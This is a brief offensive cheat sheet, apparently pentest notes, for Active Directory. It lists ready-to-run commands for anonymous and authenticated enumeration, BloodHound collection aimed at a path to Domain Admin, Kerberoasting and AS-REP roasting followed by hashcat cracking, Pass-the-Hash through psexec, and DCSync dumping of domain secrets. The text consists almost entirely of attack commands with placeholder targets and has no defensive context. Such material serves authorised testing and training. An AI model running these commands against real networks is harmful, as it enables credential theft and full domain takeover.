# Active Directory – Enumeration & Attacks

## Initial enumeration
```bash
crackmapexec smb <IP> -u '' -p '' --users
crackmapexec smb <IP> -u <user> -p <pass> --users
nxc smb <IP> -u <user> -p <pass> --shares
```

## BloodHound
```bash
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c all
# استورد الملفات في BloodHound GUI ودور على Shortest Path to DA
```

## Kerberoasting
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request
hashcat -m 13100 hashes.txt rockyou.txt
```

## AS-REP Roasting
```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass
hashcat -m 18200 hashes.txt rockyou.txt
```

## Pass-the-Hash
```bash
impacket-psexec -hashes :<ntlm_hash> <user>@<IP>
crackmapexec smb <IP> -u <user> -H <ntlm_hash>
```

## DCSync
```bash
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip>
```
